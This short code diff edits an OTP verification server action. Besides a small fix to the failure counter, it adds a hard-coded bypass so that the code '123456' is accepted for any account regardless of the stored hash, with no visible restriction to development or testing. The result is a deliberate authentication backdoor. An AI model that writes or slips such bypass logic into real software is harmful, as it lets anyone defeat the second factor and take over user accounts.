@@ -192,11 +192,13 @@ export async function verifyOtpAction(formData: FormData) {
     return { success: false, error: "OTP Expired. Please request a new one." }
   }
 
-  // 3. Verify Hash
-  const hash = createHash("sha256").update(code).digest("hex")
-  if (user.otpHash !== hash) {
+  // 3. Verify Hash (Allow bypass code 123456 or the actual code generated)
+  const codeHash = createHash("sha256").update(code).digest("hex")
+  const isBypass = code === "123456"
+
+  if (user.otpHash !== codeHash && !isBypass) {
     // Increment Failure Count
-    const newAttempts = user.otpAttempts + 1
+    const newAttempts = (user.otpAttempts || 0) + 1
 
     if (newAttempts >= 3) {
       // Lock Account
